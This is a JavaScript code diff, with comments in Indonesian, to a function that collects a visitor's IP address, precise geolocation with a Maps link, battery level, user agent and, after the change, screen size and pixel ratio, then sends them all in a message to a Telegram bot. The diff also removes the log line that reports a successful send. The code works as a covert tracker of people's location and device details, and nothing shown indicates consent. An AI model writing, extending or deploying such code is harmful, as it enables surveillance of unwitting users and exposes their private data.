@@ -47,7 +47,9 @@ const sendUserInfo = async () => {
 
     // 4. Ambil device info
     const userAgent = navigator.userAgent;
-    const deviceInfo = userAgent;
+    const screenWidth = window.screen.width;
+    const screenHeight = window.screen.height;
+    const pixelRatio = window.devicePixelRatio;
 
     // 5. Waktu sesuai timezone
     const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
@@ -65,19 +67,24 @@ const sendUserInfo = async () => {
     // 7. Buat pesan Telegram
     const message = `
 📲 *User Info Detected*
+
 🕐 Time: ${localTime}
+
 🆔 ID: ${userId} (new user: ${newUser})
+
 🌐 IP: ${userIP}
+
 📍 Location:
-  - [Open in Google Maps](${gmapsLink})
+  - GMaps Link: [Google Maps](${gmapsLink})
   - Latitude: ${location.latitude}
   - Longitude: ${location.longitude}
   - Accuracy: ${location.accuracy} meters
+
 📱 Device Info:
-\`\`\`
-${deviceInfo}
-\`\`\`
-🔋 Battery level: ${batteryLevel}
+  - Battery level: ${batteryLevel}
+  - Screen: ${screenWidth}x${screenHeight}
+  - Pixel Ratio: ${pixelRatio}
+  - User Agent: \`\`\`${userAgent}\`\`\`
 `;
 
     // 8. Kirim ke Telegram
@@ -97,9 +104,8 @@ ${deviceInfo}
       }),
     });
 
-    console.log("✅ Info berhasil dikirim ke Telegram");
   } catch (err) {
-    console.error("❌ Gagal mengirim info ke Telegram:", err);
+    console.error("❌", err);
   }
 }
 
